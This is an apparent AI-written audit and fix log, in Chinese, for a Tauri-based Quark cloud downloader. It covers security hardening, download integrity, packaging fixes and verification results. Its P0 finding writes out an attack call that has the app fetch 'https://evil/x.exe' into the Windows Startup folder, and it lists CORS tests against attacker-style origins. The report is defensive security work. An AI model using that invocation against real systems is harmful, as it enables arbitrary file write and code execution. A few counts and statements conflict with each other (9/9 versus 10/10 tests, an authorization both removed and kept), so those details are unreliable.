# Quark Downloader Pro 项目问题清单

> 审查范围：`src-tauri/src/*.rs`（全部 3 个文件）、`frontend/src/**`（全部 26 个文件）、`frontend` 配置、`src-tauri` 配置、`package.json`、`.github/workflows/release.yml`、`README.md`、git 状态。
>
> 审查方式：逐行阅读 + 实际执行 `npm run build`、`npm run lint`、`tsc --noEmit`，并与 Tauri / tauri-bundler 官方源码交叉验证。
>
> **环境限制**：本机未安装 Rust 工具链（`cargo` 不存在，`src-tauri/target/` 为空），因此 **Rust 侧结论全部来自代码阅读，未经编译和运行验证**；前端侧已实测通过/失败项均标注。
>
> **复核方式**：除本人通读全部文件外，另做了两轮独立复核（前端缺陷 / 构建·配置·CI），并对 Rust 侧 13 条结论逐条做了对抗式裁断。裁断结果已在正文修正：第 30 条（`thread_count > total_size` 下溢）被判定为**当前不可达的潜在隐患**（且 release 下是回绕而非 panic）；P0-1 的"干净 EOF 静默截断"触发机制被修正（见该条的边界说明）；第 14 条（shell 插件）与第 13 条（CORS）的严重度被下调以避免夸大。第 0 节的严重链路是复核阶段才发现的。

---

## 修复记录（本次已实施）

> 前端改动经 `npm run lint`（exit 0，修复前 3 errors + 1 warning）与 `npm run build`（exit 0）**实测通过**。
> Rust 改动已在本地**真实编译验证**：`cargo check --all-targets` exit 0（本仓库代码零警告）、`cargo test` exit 0（**10/10 通过**）、`cargo clippy` 零警告。
> 工具链：rustc 1.99.0 / cargo 1.99.0（`x86_64-pc-windows-gnu`，GNU 链接器）。`Cargo.lock` 已把 `tauri` 从 2.10.2 更新到 **2.12.2**。

### A. 安全
- `src-tauri/Cargo.toml`：`tauri` 由 `"2"` 提到 `"2.11.1"`（含原因注释）。这关闭了第 0 节的 IPC/ACL 漏洞：2.11.1 起"远程来源一律走 ACL 解析"。
- `src-tauri/src/main.rs`：`on_navigation` 改为**来源白名单**（`tauri://`、`tauri.localhost`、`localhost`、`127.0.0.1`），其余来源拒绝导航并打印安全日志；允许的导航（重载）仍取消在跑下载。
- `src-tauri/src/main.rs`：新增 `validate_download_url`（仅 http(s)，拒绝 localhost/127./::1/169.254./`*.localhost`）与 `sanitize_filename`（只取 basename、过滤非法字符与控制字符、去掉结尾点/空格、规避 Windows 保留设备名、限长 200），`download_file` 入口强制校验。
- `src-tauri/src/main.rs`：重定向跟随改为**跨主机自动剥离 Cookie**（原先每个跳转都重发完整夸克会话，任何人只要出现在 Location 链上就能拿到）。
- `src-tauri/src/main.rs`：`add_headers` 在 Cookie 为空时不再发送空 `Cookie` 头。
- `src-tauri/tauri.conf.json`：`"csp": null` → 白名单 CSP（`default-src 'self' tauri: asset: …`，`connect-src` 含 `ipc:`/`http://ipc.localhost`/`http://127.0.0.1:3000`/dev server 与 HMR ws）。
- `src-tauri/src/api_server.rs`：`__puus` 捕获改为"取**最后一个非空**值"，删除型 Cookie（`__puus=; Max-Age=0`）不再覆盖有效值；同时删掉了重复判断的冗余分支。
- 未做 `AppManifest`：它与 capability 强耦合，贸然声明会让**本地前端**也被 ACL 拒绝（自定义命令必须同时在 capabilities 里放行），而 2.11.1 已关闭远程路径，故不引入这个无法编译验证的风险。
- ~~`tauri-plugin-shell` 暂未移除~~ **已在第二轮修复中移除**（见 G 节）：依赖、`.plugin()` 注册与 `shell:allow-spawn`/`shell:allow-kill` 授权一并删除，缩小爆炸半径。

### B. 下载正确性与数据安全
- `download_segment_once`：强制 206；**校验 `Content-Range` 前缀**；循环后**校验实际字节数 == 期望**；`download_segment` 外层加 3 次重试 + 退避。
- 合并后**校验最终文件长度**：不一致立即删除并报错（不再交付静默损坏的文件，也不再谎报 100%）。
- 单线程路径同样校验长度；**所有失败路径都会删除半成品**（原先写盘/flush 失败会把截断文件留在最终文件名下）。
- `reserve_save_path`：用 `OpenOptions::create_new` **原子占位**，彻底消除并发同名互相覆盖（含"取消会删掉另一个任务的文件"）。
- 线程数：默认 16、上限 64（Rust clamp + 前端 store/滑块/数字框一致）；分片数限制为不超过总字节数（`build_segments`，消除潜在下溢）；旧 `resolve_save_path` 已删除。
- `TempDirGuard`（RAII）：任何提前返回（含 `?`）都会清理 `.quark_temp_*`，不再泄漏上千个分片。
- 合并**前后**都检查取消；合并失败/取消都会清掉半个最终文件。
- 非 200（含无 Location 的 3xx、204）一律当错误，不再把重定向响应体当文件写入。

### C. 健壮性与性能
- 下载客户端新增 `read_timeout(60s)`：CDN 半死连接不再永久挂住（这是"取消"能真正生效的前提）。
- `quark_client.rs`：`build_client` 改为 `OnceLock` **进程内共享 Client** + `connect_timeout(10s)` / `timeout(60s)`，解析大分享不再每个请求重新做 TLS 握手。
- 错误文本改为 `truncate_chars`（按字符截断），消除中文错误页触发的 `byte index 200 is not a char boundary` panic。
- 删除 `can_read_account_info` 里永不生效的死代码分支。
- `PORT` 环境变量保留但加了显式告警（前端仍固定 3000，避免静默失效）。

### D. 前端
- 进度监听移到**始终挂载**的 `App.tsx`（面板关闭不再丢进度、完成行不再永久残留）；新增**取消按钮**（停止派发新文件 + 调用 `cancel_downloads`，把"已取消"按提示而非报错处理）。
- 批次结果**如实统计**：`完成：成功 X 个，失败 Y 个`，全失败时给 error 而非成功提示；跳过/失败不再计入成功。
- `logs` 与 `shareInfo.status` 终于有 UI（面板内最近 6 条日志 + 输入框下方状态行），store 侧日志上限 200。
- 容量请求失败不再永久禁用刷新按钮（`finally` 复位，App 与 MainLayout 各一处）。
- 解析加**重入保护**；二维码轮询不再被无关 store 更新打断（`onClose` 走 ref）；`missing_puus` 会提示用户。
- AuthModal：**先验证后落盘**，失败恢复原 Cookie；"重置"改名"清空"且不再触发远端注销；`onLogout` 冗余 prop 移除。
- 线程数 UI 与后端一致（1–64，默认 16）；`Sidebar` 改为订阅式读取（不再 `getState()` 取值渲染）；修正错字"正在提出"→"正在退出"。
- `FileTree` 展开状态改为组件内不可变状态（不再直接改 store 里的节点对象）。
- `http.ts`：`__puus` 轮换时**覆盖旧值**（原来只写一次，之后永远用过期 nonce）。
- ESLint 3 个 error 全部修掉（badge/button 不再导出 variants、input 改为 type 别名）；`index.html` 标题与 `lang` 修正。

### E. 工程卫生与文档
- **`.gitignore` 已写好并验证**：`git check-ignore` 命中 node_modules/dist/target/gen，待跟踪文件 **12,181 → 58**；`!.env.example` 反例验证通过。
- 移除未使用的 14.3 MB 字体 → 移到 `unused-assets/fonts/`（已 gitignore，未删除）；`frontend/dist` **15.71 MB → 2.11 MB**。
- 根 `package.json`：五个 `tauri:build:*` 的 `--target` 改为 `-t`（原先传给 cargo 而非 Tauri，universal 必失败）；删除未使用的 `concurrently`；新增 `engines`。
- CI：新增 `lint` job 且 `build needs: lint`（lint 不过则发版被拦）；macos-x64 改用 `macos-15-intel`；删除会让依赖漂移的 `npm install @tauri-apps/cli`；`workflow_dispatch` 现在**必填 tag**（不再产出 `releases/tag/main`）。
- README：线程数（16，1–64）、克隆地址、下载链接、Rust ≥ 1.77.2、Windows 产物（便携 exe + MSI + NSIS）、目录树全部对齐；新增 `frontend/.env.example`；修正 `VITE_API_BASE_URL` 的说明（留空 ≠ 相对路径）。

### F. 新增功能（本次需求）
- **下载管理（逐任务控制）**
  - Rust：新增按任务索引的控制状态表 `TASK_STATES: OnceLock<Mutex<HashMap<String, TaskState>>>`（`paused` / `cancelled`，锁中毒时降级为继续使用旧数据而不 panic），三个命令 `pause_task` / `resume_task` / `cancel_task`；`download_file` 新增 `task_id` 参数（前端生成，同时作为进度事件里的 `id`，从而"每行可控"），并在排队阶段就被取消时直接失败、任务结束后清理状态避免表无限增长；`wait_if_paused(task_id, epoch)` 现在同时看全局暂停与单任务暂停，并被全局取消/单任务取消打断，闸门位置不变（每个读取循环顶部、队列文件启动处、合并前），因此暂停/取消点始终落在两个 chunk 之间。
  - 前端：`useQuarkStore` 用 `downloadTasks: DownloadTask[]`（排队中/转存中/准备中/下载中/已暂停/已完成/失败/已取消）取代原来的 `activeDownloads` 进度表；新增共享模块 `features/download/taskControls.ts`（调度器 + 暂停闸门 + 逐任务/批次控制），把固定 worker 池改为"调度器 + 每任务流水线"：暂停任务被 **park（移出并发额度）**，因此暂停几个任务不会饿死队列；新增 `features/manager/DownloadTasksView.tsx` 下载管理页（统计 chip、状态徽章、进度/速度/失败原因、逐行 暂停/继续/取消/移除、全部暂停/继续/取消、清理已结束）；侧边栏新增「下载管理」入口并带未结束任务角标；顶部进度岛改为从 `downloadTasks` 派生。
  - 全局限定的语义保持：`cancel_downloads` = 取消全部并递增代际 + 清空单任务标记；`pause_downloads`/`resume_downloads` = 全部暂停/恢复。
  - 隔离性由单测保证：单任务暂停只影响该任务、其它任务正常放行；单任务取消能立刻打断暂停等待；任务清理后不残留暂停/取消状态。
  - 有意取舍：`maxConcurrent` 不额外加 parked 数（否则"同时下载 2"会变成 3 个文件在传）；`pause_task`/`cancel_task` 只在 `download_file` 已发出时调后端，排队/转存阶段由前端闸门处理；批次还剩暂停任务时会等待用户继续或取消（避免汇总计数与在途请求被提前丢弃）。
- **暂停 / 继续**（Rust + 前端）
  - Rust：`DOWNLOAD_PAUSED` 全局开关 + `pause_downloads` / `resume_downloads` 命令；`wait_if_paused(epoch)` 闸门放在每个读取循环顶部（分片、单线程）、队列中的文件启动处、以及合并开始前。暂停期间任务**不退出**：连接、已写入的临时分片、网盘转存文件全部保留，恢复后从当前进度继续；若长时间暂停导致连接被判超时，那一片会走已有的 3 次重试（**整片重下**，不会产生错位数据）。暂停期间被取消会立即从等待中返回错误。
  - 前端：下载面板新增「暂停 / 继续」按钮（下载中可用，暂停时按钮变绿显示"继续"）；worker 循环在暂停时停止派发新文件；进度岛显示"已暂停"。
  - 边界处理：`cancel_downloads` 会**同时清除暂停标志**（否则下一批一启动就挂住）；前端在批次收尾时若仍处于暂停（例如暂停恰好发生在转存阶段、没有在途下载）会主动 `resume_downloads` 复位；`startDownload` 开头也做防御性复位。
- **解析历史**：localStorage（key `quark_parse_history`）保存最近 50 条解析记录（链接、文件数、目录数、总大小、时间），同一链接按 pwdId 去重只留最新；支持**重新解析**（回到解析页并用原链接重新走一遍——不直接复用旧数据，因为分享令牌会过期）、复制链接、单条删除、清空（就地二次确认）。
- **软件设置**：新增 `src-tauri/src/settings.rs`（settings.json 持久化 + 绝对路径/文件/可创建/可写四重校验，写入探针文件验证可写性，配置损坏自动回退默认值）；三个新命令 `get_settings` / `set_download_dir`（`path: null` 即恢复默认）/ `open_download_dir`（资源管理器打开）；`download_file` 改为读取配置目录，配置目录失效时回退系统默认并留日志；新增 `tauri-plugin-dialog` + `dialog:allow-open` 提供**原生目录选择器**；设置页含下载目录、下载线程/并发（从侧边栏迁入，避免重复控件）、解析历史计数与清空、关于；启动时打印一次生效的下载目录，便于排查"文件下到哪了"。
  - 配置文件位置：`%APPDATA%\com.quark.downloader\settings.json`（`app_config_dir/settings.json`）。

### G. 第二轮修复（发布前独立审查发现的问题）

发布前又做了三路独立对抗式审查（新调度器 / Rust 后端 / 旧清单逐条复核），发现并修复：

**G1. 下载管理：3 个"批次永久卡死"级缺陷（前端）**
- 「全部继续」会把**已结束**的任务复活成幽灵并发额度（`parkedIds` 从不清理 + `unparkAllTasks` 缺已结束守卫），使 `hasPendingWork()` 永真、批次收尾循环永久等待，"开始任务"永久禁用且「全部取消」也救不回来。修复：`finishTask`/`forgetTask` 清理全部记账（新增 `pipelineIds` 识别幽灵额度），`unparkAllTasks` 跳过已结束任务，`abandonPendingTasks` 丢弃无流水线的幽灵额度。
- 单任务暂停 + 全部暂停 + 全部继续后，Rust 侧单任务暂停标志仍为真 → 行显示"下载中"却 0 B/s 到永远、整批不结束。修复：`unparkAllTasks` 对在途任务补发 `invoke('resume_task')`。
- 暂停/继续在 `await` 之后不复检任务状态 → 已完成的行被改回"已暂停/下载中"并留下幽灵额度。修复：每次 IPC 后用 `findLiveTask` 复检，命中即 `forgetTask` 并返回 false。
- 另外修复：「全部继续」对单任务暂停行无效却提示"没有暂停中的任务"（改为退化为逐行恢复）；转存超时把文件静默留在网盘（预算 20→40 次、补查一次、拿到 fid 就兜底删除、拿不到则明确 warning）；非在途任务不必要的 `cancel_task` 调用（并在 Rust 侧消除对应泄漏）；取消判定改为**本地状态优先**，服务端文案仅作窄化兜底；新批次任务行与旧批次交错排列；批次暂停状态收敛到 store（`batchPaused`）作为唯一真值，两个视图不再各存一份。

**G2. Rust：合并阶段的单任务取消失效（用户可见）**
- 合并结束后只检查了全局取消代际，没检查单任务取消标志 → 用户对大文件点「取消」，合并完仍返回成功、任务行变绿。修复：合并后与单线程收尾都同时检查 `is_cancelled(epoch) || task_cancelled(id)` 并删除半成品。
- 顺带加固：`download_file` 的早退分支（URL/文件名/预留路径校验失败）补 `clear_task`，不再泄漏状态表条目；启动时先固化 epoch 再判取消，堵住"取消全部"与任务启动之间的窄竞态；`on_navigation` 现在真的重置全局暂停与任务状态（与注释里"刷新 == 取消"一致）；重定向目标也要过 `validate_download_url`（不再只校验初始 URL）。

**G3. 设置持久化**
- `settings.json` 改为"写临时文件 + 原子替换"，避免截断写入期间被并发读成空 → 静默回退系统下载目录。
- 写权限探针改为**唯一文件名 + `create_new`**：既不覆盖用户目录里同名文件，也不受上次异常退出残留探针影响。

**G4. 固定端口与登录凭证（安全）**
- 前端新增**内嵌服务身份校验**：第一次请求前探测 `/api/health`，确认是本应用（`service: quark-api-rust`）才注入 `x-cookie`；否则拒绝发送并给出明确中文错误 —— 防的是"127.0.0.1:3000 被别的本地程序抢占后，登录 Cookie 被发给它"。连接类失败会重试而不是永久缓存失败（避免启动瞬间误判）。
- 后端绑定端口失败不再 `expect` panic（那样窗口照开、接口全废且无提示），改为打印醒目错误并让应用继续运行。
- 内嵌服务 CORS 从 `Any/Any/Any` 收紧为来源白名单（dev server 1420 + `http://tauri.localhost` + `tauri://localhost`），不再是"任意本地网页都能调用这个代理"。
- 登录改为**先校验后写入**：用待验证的 Cookie 直接发请求，通过才写 localStorage，验证失败/中途异常都不会破坏已有登录状态。

**G5. 清理与文档**
- 删除脚手架残留：`frontend/src/App.css`、`frontend/src/assets/react.svg`、`frontend/public/vite.svg`；favicon 改用应用图标（`frontend/public/icon.png`）；`frontend/package.json` 补 `engines.node`。
- 移除完全未使用的 `tauri-plugin-shell`（依赖 + 注册 + `shell:allow-spawn`/`shell:allow-kill` 授权）。
- 二维码登录的 Cookie 拼接改用统一的 `build_cookie_header`（同名去重），不再可能出现重复/过期的 `__puus`、`__uid`。
- README：修正 tauri 版本说明（锁 2.12.2，不再声称"待升级"）、暂停语义（转存已发出时无法中断）、新增「常见问题」章节（端口占用 / 网盘残留 / 临时分片 / 日志位置）。
- **更正一条先前的错误结论**：`core:window:allow-is-maximized` **不是**冗余授权 —— `TitleBar.tsx` 用 `appWindow.isMaximized()` 渲染最大化图标，删掉会导致权限拒绝、图标状态失效。已保留。

### H. 发布阻断问题：release 版双击无法启动（已修复）

**症状**：双击免安装 exe（或安装后双击图标）窗口一闪而过、或完全没有反应，没有任何错误提示。

**根因**：release 构建带 `#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]`，是 Windows **GUI 子系统**程序。用户双击启动时进程**没有控制台**，stdout/stderr 句柄无效；而 Rust 的 `println!` 在写入失败时会 panic（std 文档原文："Panics if writing to stdout fails"）。代码在窗口创建完成后立即执行 `println!("[settings] 下载目录: ...")`，于是**窗口刚出现就被 panic 终止** —— 表现正是"一闪而过"。

**为什么之前的验证没发现**：dev 构建是控制台程序（该属性不生效）；而所有自动化验证（`tauri dev`、后台任务）都把 stdout 重定向到管道/文件，句柄有效 → 从不触发。

**修复**：
- 新增 `log_line!` / `log_err!` 宏：`writeln!` 的返回值直接丢弃，写失败静默忽略；从终端启动时行为与 `println!` 完全一致。共替换 32 处。
- 新增 panic 钩子：启动失败时弹出**原生错误框**（`user32!MessageBoxW`，零新依赖），把"无声消失"变成用户可读的错误信息（附 WebView2 / 杀毒软件排查提示）。

**打包修复**：
- `webviewInstallMode` 改为 `embedBootstrapper`：安装时不再联网下载 WebView2 引导程序（此前会因下载超时导致**安装中途报错**）。
- 三个产物改为**同一次构建**产出，修掉 MSI 比 exe 早 4.5 分钟的版本不一致。
- 新增**免安装版 ZIP**（exe + `WebView2Loader.dll` + README）：单拷 exe 到别处会因缺少该 DLL 而无法启动。

**仍未处理（有意为之，均为低危或需要你决策）**：安装包签名/公证、前端单 chunk 593 KB 拆包、macOS 图标集（`icon.png` 可由打包器合成 icns）、`tauri-plugin-log` 持久化日志、`target="_blank"` 外链点击无效（需引入 opener 插件）、`is_trusted_origin` 允许任意 localhost 端口（Tauri 内部仍将非 app/dev 来源判为 Remote，不可达 IPC）、合并过程本身不可中断。

### I. 安装包缺失 WebView2Loader.dll：NSIS 安装后无法启动（已修复）

**症状**：MSI / NSIS 安装完成后（或解压免安装版后）双击图标/exe，窗口一闪而过或毫无反应；进程退出码 `0xC0000135`（`STATUS_DLL_NOT_FOUND`）。

**根因**：本项目 Windows 侧用 **GNU** 工具链（`x86_64-pc-windows-gnu`）构建，而 `webview2-com-sys` 只在 **MSVC** 下把 WebView2 加载器静态链接进去：

```rust
target_env = "msvc"       => link(name = "WebView2LoaderStatic", kind = "static")
not(target_env = "msvc")  => link(name = "WebView2Loader.dll")   // 运行时需要同目录的 DLL
```

所以 GNU 构建出的 exe **运行时依赖同目录的 `WebView2Loader.dll`**。而 tauri-bundler 只在下面这个条件成立时才自动把 DLL 塞进 NSIS 安装包：

```rust
// crates/tauri-bundler/src/bundle/windows/nsis/mod.rs :: generate_resource_data
if settings.target().ends_with("-gnu") { resources.insert(loader_path, ...) }
```

`npm run tauri:build` 不带 `--target` 时 `settings.target()` 为空，条件不成立 —— **NSIS 安装包里只有 exe，没有 DLL**（MSI 走另一条分支恰好带上了，免安装 ZIP 由 CLI 另一处生成也带上了）。三个产物里只有 NSIS 因此失效。

**修复**：新增 `src-tauri/tauri.windows.conf.json`（Tauri 在 Windows 构建时会自动查找并合并该文件），把 DLL 显式声明为打包资源：

```json
{ "bundle": { "resources": { "webview2/WebView2Loader.dll": "WebView2Loader.dll" } } }
```

DLL 随仓库放在 `src-tauri/webview2/`（取自 `webview2-com-sys` 的 x64 目录）。这样无论是否传 `--target`、由谁来构建，MSI / NSIS 都会带上它，不再依赖 bundler 那个 `-gnu` 判断；放在 Windows 专属配置里，macOS 的 .app/.dmg 不会被塞进一个 Windows DLL。

**验证**（本机 GNU 工具链，全量 `npm run tauri:build` 后逐一实测）：

| 产物 | 内容 | 实测结果 |
|---|---|---|
| NSIS `*-setup.exe` | exe + `WebView2Loader.dll` + uninstall.exe | 静默安装 exit 0；安装目录含 DLL；启动后进程持续存活（修复前为 `0xC0000135`） |
| MSI | exe + `WebView2Loader.dll` | `msiexec /a` 解包确认含 DLL；直接运行包内 exe 正常存活 |
| 免安装 ZIP | exe + `WebView2Loader.dll` + README | 解压后双击 exe 正常存活 |

> 说明：安装包内的 exe 与 `target/release` 下的 exe 有 3 字节差异，是 tauri-bundler 就地把 `__TAURI_BUNDLE_TYPE_VAR_UNK` 改写成 `__TAURI_BUNDLE_TYPE_VAR_NSS`（记录打包类型）所致，属预期行为。

> 另：若有人显式用 `-t x86_64-pc-windows-gnu` 构建，bundler 的 `-gnu` 分支会再自动加一次同名资源，NSIS 包里会出现两条 `File /oname=WebView2Loader.dll`（内容相同，安装包约多 70 KB），MSI 会自动去重；按 README 的 `npm run tauri:build`（不带 `--target`）构建不会重复。

### J. 清理冗余文件与代码（已实施）

- 删除 4 个 `debug.log`（仓库根、`src-tauri/`、`target/release/`、`target/release/bundle/nsis/`）：搜狗输入法写出的日志，与项目无关（`*.log` 已忽略，从未入库）。
- `frontend/package.json`：移除两个**从未被 import** 的依赖 `@radix-ui/react-label`、`@radix-ui/react-separator`（`package-lock.json` 同步收缩 4 个包）。删掉后 `vite build` 的产物文件名与哈希完全不变（`index-DuagzbZF.css` / `index-CzE2w4uf.js`），可确认是死依赖而非漏用。
- `src-tauri/capabilities/default.json`：移除冗余授权 `core:window:allow-is-maximized` —— 已被 `core:default` → `core:window:default` 覆盖（依据 `gen/schemas/acl-manifests.json`）。其余 4 条 window 授权经核对**不在**默认集内，保留。
- `.gitignore`：删除两条重复规则（`frontend/node_modules/`、`frontend/dist/`，分别被 `node_modules/`、`dist/` 覆盖），用 `git check-ignore -v` 逐条确认忽略行为不变。

清理后重跑 `npm run tauri:build`（前端 `lint` exit 0、`build` exit 0、`cargo check --all-targets` exit 0），MSI / NSIS / 免安装 ZIP 三个产物实测均能正常启动。

> **未清理（等你决定）**：`unused-assets/fonts/SourceHanSansSC-VF.otf.woff2`（14.2 MB）。它未被任何代码引用、从未入库（删了无法从 git 恢复），但 README 的结构表与 `.gitignore` 都按「本地保留但不参与打包」记录，所以没有擅自删除。

### 本次验证（命令与结果）
| 检查 | 结果 |
|---|---|
| `npm --prefix frontend run lint` | **exit 0**（修复前 exit 1，3 errors + 1 warning） |
| `npm --prefix frontend run build` | **exit 0**，`dist` 2.11 MB（原 15.71 MB） |
| `cargo check --all-targets`（src-tauri） | **exit 0**，本仓库代码 **0 警告**；`tauri` 解析为 **2.12.2**、`tauri-build` 2.7.1、`wry` 0.57.0 |
| `cargo test --bin quark-downloader-pro` | **exit 0，9/9 通过**（分片覆盖/下溢、文件名清洗、URL 校验、来源白名单、UTF-8 截断、**暂停闸门**（挂起→恢复→取消打断）、**设置读写回退**、**下载目录校验**；测试二进制成功链接 = 整个 Tauri 程序可链接） |
| `cargo clippy --all-targets` | **exit 0，零警告**（clippy 0.1.99；此前 11 条风格建议已全部处理：`useless_conversion`、3×`unnecessary_map_or`、`filter_next`、2×`manual_pattern_char_comparison`，4 个下载函数按需显式 `#[allow(clippy::too_many_arguments)]`） |
| 实跑 `npm run tauri:dev` | 应用启动成功：`[settings] 下载目录: "C:\\Users\\Lenovo\\Downloads"`（设置解析生效）、`[quark-api] 内嵌服务已启动`、`on_navigation` 放行 dev 来源且无 `[security] 已阻止` 日志、页面 JS 执行并成功 IPC（epoch 1→2）、`[api-proxy] 捕获到 __puus cookie!`（新的非空取值逻辑在真实响应上生效）；`/api/health` 返回 200；应用进程 `Responding=True`、WebView2 子进程已起；验证后优雅关闭并释放 1420/3000 端口 |
| `git check-ignore` / 待跟踪计数 | 构建产物全部命中；**12,181 → 63**（含本轮新增的 `settings.rs`、`HistoryView.tsx`、`SettingsView.tsx`、`DownloadTasksView.tsx`、`taskControls.ts`） |
| Rust 语法闸门（ast-grep `kind: ERROR`，tree-sitter） | 三个 `.rs` **0 findings**；反例文件能报错（闸门有效） |
| CI YAML 解析（PyYAML） | 通过（`jobs=[lint,build]`、`build.needs=lint`） |
| 锁文件同步 | 根与前端 `npm ci --dry-run` 均 exit 0 |
| **发布构建** `npm run tauri:build` | **release 编译成功**（`Finished release profile in 2m35s`），产物：`quark-downloader-pro.exe` 27.36 MB、`Quark Downloader Pro_0.1.0_x64_en-US.msi` 9.26 MB、`Quark Downloader Pro_0.1.0_x64-setup.exe`（NSIS）6.54 MB |
| **生产模式实跑**（release exe + 内嵌 dist） | 启动成功：`[settings] 下载目录` / `[quark-api] 内嵌服务已启动` / 页面导航事件 / 前端 JS 挂载并成功 IPC（epoch 1→2）；`/api/health` 返回 `{"ok":true,"service":"quark-api-rust"}` |
| **CORS 白名单实测** | `Origin: http://tauri.localhost` → 回显该来源（放行）；`http://127.0.0.1:1420` → 放行；`http://evil.example`、`https://attacker.test` → **无 `Access-Control-Allow-Origin`**（拒绝） |
| **GNU 工具链产物依赖检查** | release exe 的导入表**不含** `libgcc_s_seh-1.dll` / `libwinpthread-1.dll` / `libstdc++-6.dll` → 在未安装 MinGW 的机器上可直接运行 |

编译过程中唯一残留的警告来自 build script 的 MinGW 链接器（`corrupt .drectve at end of def file`），属 GNU 工具链对 tauri-build 生成的 `.def` 的固有提示，与本仓库代码无关（MSVC 工具链下不会出现）。

> **本会话环境说明（不是项目问题，但会影响复现）**：会话中途沙箱收紧后，**子进程**（esbuild、WebView2 浏览器进程、测试二进制）在 `%TEMP%` 与 `%LOCALAPPDATA%` 下的部分操作被拒：
> - `npm --prefix frontend run build` 会在 `vite:esbuild-transpile` 报 `remove ...\Temp\esbuild-xxx: Access is denied`；把 `TEMP`/`TMP` 指到工作区内目录即可通过（已验证：`✓ built in 4.54s`，dist 2.14 MB）。
> - `cargo test` 的两个设置类用例会在 `src/settings.rs:76` 建临时目录时被拒而失败；同样把 `TEMP` 指到工作区内后 **10/10 全通过**。
> - WebView2 无法在 `%LOCALAPPDATA%\com.quark.downloader` 建 profile（`0x800700AA`/`0x8000FFFF`）；把 `WEBVIEW2_USER_DATA_FOLDER` 指到工作区内目录即正常启动（已验证）。**这只影响本会话内的自动化验证**，你在普通终端里运行不受影响。
> - 验证期间被你此前强杀的实例弄脏的原 profile 已备份并**原样还原**（`EBWebView`，localStorage 完好，时间戳未变）；临时验证 profile 已删除。
>
> **打包工具下载超时的解决办法（本机实测）**：`tauri build` 首次打包时会自行下载 WiX / NSIS 工具包，在本机网络上会以 `failed to bundle project timeout: global` 失败（WiX 包 39 MB）。手动预置即可绕过：把
> `wix314-binaries.zip`（wixtoolset/wix3 的 wix3141rtm 资源）解压到 `%LOCALAPPDATA%\tauri\WixTools314`；
> 把 `nsis-3.11.zip`（tauri-apps/binary-releases 的 nsis-3.11 资源）**剥掉顶层目录**解压到 `%LOCALAPPDATA%\tauri\NSIS`（即 `NSIS\Bin\makensis.exe`），
> 并把 `nsis_tauri_utils.dll`（tauri-apps/nsis-tauri-utils 的 nsis_tauri_utils-v0.5.3 资源）放到 `NSIS\Plugins\x86-unicode\additional\` 与 `%LOCALAPPDATA%\tauri\` 两处。
> 打包器会按固定清单校验（`Bin/makensis.exe`、`Stubs/lzma-*`、`Plugins/x86-unicode/additional/nsis_tauri_utils.dll`、`Include/*.nsh` 共 12 项），缺一项就会删目录重下。

### 仍需你处理 / 决策
1. ~~Rust 未编译验证~~ **已完成**：`cargo check` / `cargo test`（10/10）/ `cargo clippy`（零警告）全部通过，`Cargo.lock` 已更新到 tauri 2.12.2。
2. **CSP 与 CORS 白名单需实机确认**：若出现白屏 / IPC 失败，把 `src-tauri/tauri.conf.json` 的 `csp` 改回 `null`；若生产环境提示跨域错误，检查 `src-tauri/src/api_server.rs` 的 `allowed_origins()`（需要包含 `http://tauri.localhost`）。
3. **逐任务暂停/继续/取消需要在真机上点一次确认**：单测与三路独立审查覆盖了闸门语义、任务隔离与状态机，实跑覆盖了启动与 IPC，但"点某一行暂停、进度停住、点继续接着下"只有你能看到。
4. 低优先级未动（均为低危，不影响发布）：安装包签名/公证、593 KB 单 chunk 拆包、macOS 图标集、`tauri-plugin-log` 持久化日志、`target="_blank"` 外链（需引入 opener 插件）、`is_trusted_origin` 允许任意 localhost 端口。
5. 端到端仍需一次真机点击测试（登录 + 真实下载），这部分无法由编译验证覆盖。
6. **发布到 GitHub 前**：仓库当前**没有任何提交、也没有 remote**（`git log` 为空、`git remote -v` 为空），需要先 `git init` → 提交 → 关联远程 → 打 tag；`.github/workflows/release.yml` 由 tag 触发并需要手动填 `tag` 输入。

---

## 零、最严重（P0-0）：锁定的 Tauri 版本 + 缺少 AppManifest + 允许任意导航 = 远程任意文件写入链

这一条是独立复核时才发现的，严重程度高于下面全部条目，**建议第一优先修**。

**已核验的事实（上游 CHANGELOG 原文，非推测）**

1. `src-tauri/Cargo.lock:3690-3691` 锁定 `name = "tauri" version = "2.10.2"`（`Cargo.toml:13` 写的是 `tauri = { version = "2" }`，所以只有这份 lockfile 把实际版本钉在 2.10.2）。
2. `src-tauri/build.rs` 全文只有 `tauri_build::build()`，**没有配置 `AppManifest`**。
3. Tauri 上游 `crates/tauri/CHANGELOG.md` 的 **2.11.1 "Security fixes"** 段落（PR #15266）原文：

   > Enforce ACL checks for IPC requests from remote origins even when no `AppManifest` is configured. **Previously, custom (non-plugin) commands bypassed ACL entirely without an `AppManifest`, allowing any origin to invoke them.** Now, remote origins are always subject to ACL resolution, and can only reach custom commands if an explicit `remote` capability has been granted.

   同一段还有第二个安全修复：Windows/Android 上 `.localhost` 后缀处理不当，导致 Tauri 会把 `http://app.evil.com/` 判定为**本地来源**（本地来源正是本项目 `capabilities/default.json` 授权的对象，含 `shell:allow-spawn`）。

   > 版本确认方式：分别取 `tauri-v2.11.0` 与 `tauri-v2.12.0` 两个 tag 的 CHANGELOG 对比 —— v2.11.0 中两条修复**均不存在**，v2.12.0 中两条都出现在 `## [2.11.1]` 段落内，即 **修复版本为 2.11.1**（注意 CHANGELOG 里该版本标题写作转义的 `## \[2.11.1]`，用 `^## \[` 匹配会漏掉它，从而误判为 2.12.0）。

**本项目自身提供的那一半**

4. 本项目的自定义命令恰好是最危险的两个：`main.rs:592` 注册 `download_file` / `cancel_downloads`；`main.rs:131-137` 的 `download_file(url, cookie, filename, thread_count)` 里 **url 与 filename 全部由调用方提供**。
5. `main.rs:91` `downloads_dir.join(filename)` 对绝对路径整体替换、对 `..\..\` 直接穿越（见第 3 条），`main.rs:413-416` 还会把最终写入的绝对路径回传给调用方。
6. `main.rs:608-616` 的 `on_navigation` **不判断 URL，一律返回 `true`** —— 主 WebView 没有被限制在任何来源白名单内。

**组合后果**：一旦主 WebView 被导航到攻击者页面（拖拽链接进窗口、同框架链接、未来的 `location` 赋值等任一路径），在 2.10.2 上该远程来源可以直接 `invoke('download_file', { url: 'https://evil/x.exe', filename: 'C:\\Users\\<用户>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.exe' })`，让程序自己把攻击者的文件写到任意路径 —— **远程任意文件写入，进而在下次登录时执行任意代码**。攻击者无需拿到用户的夸克 Cookie（`cookie` 参数可以传空串，CDN 直链本身带鉴权）。

